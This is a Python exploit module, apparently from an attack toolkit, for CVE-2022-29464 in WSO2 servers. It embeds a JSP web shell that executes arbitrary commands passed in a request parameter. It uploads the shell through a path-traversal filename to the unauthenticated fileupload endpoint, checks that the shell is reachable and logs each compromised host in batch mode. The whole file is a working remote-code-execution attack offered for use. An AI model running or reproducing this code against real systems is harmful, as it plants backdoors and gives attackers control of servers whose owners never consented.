import requests, urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2022_29464:
    def main(self,target):
        self.batch = target["batch_work"]
        host=target["url"].strip('/ ')
        file = target["shell"]
        ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)

        shell = """<FORM>
            <INPUT name='cmd' type=text>
            <INPUT type=submit value='Run'>
        </FORM>
        <%@ page import="java.io.*" %>
            <%
            String cmd = request.getParameter("cmd");
            String output = "";
            if(cmd != null) {
                String s = null;
                try {
                    Process p = Runtime.getRuntime().exec(cmd,null,null);
                    BufferedReader sI = new BufferedReader(new
        InputStreamReader(p.getInputStream()));
                    while((s = sI.readLine()) != null) { output += s+"</br>"; }
                }  catch(IOException e) {   e.printStackTrace();   }
            }
        %>
                <pre><%=output %></pre>"""

        if not self.batch:
            OutPrintInfo("WSO2","开始进行文件上传...")
        files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{file}": shell}
        try:
            response = requests.post(f'{host}/fileupload/toolsAny', files=files, verify=ssl,proxies=self.proxy,headers=self.headers,timeout=timeout)
            url2 = host + f"/authenticationendpoint/{file}"
            ck = requests.get(url2,verify=ssl,proxies=self.proxy,headers=self.headers,timeout=timeout)
            if "run" in ck.text:
                OutPrintInfoSuc("WSO2",f"Shell @ {host}/authenticationendpoint/{file}")
                if self.batch:
                    with open("./result/wso2_2022_29464.txt","a") as w:
                        w.write(f"{url2}------Shell: {host}/authenticationendpoint/{file}\n")
        except Exception:
            if not self.batch:
                OutPrintInfo("WSO2","目标不存在文件上传")
        if not self.batch:
            OutPrintInfo("WSO2", "文件上传检测结束")
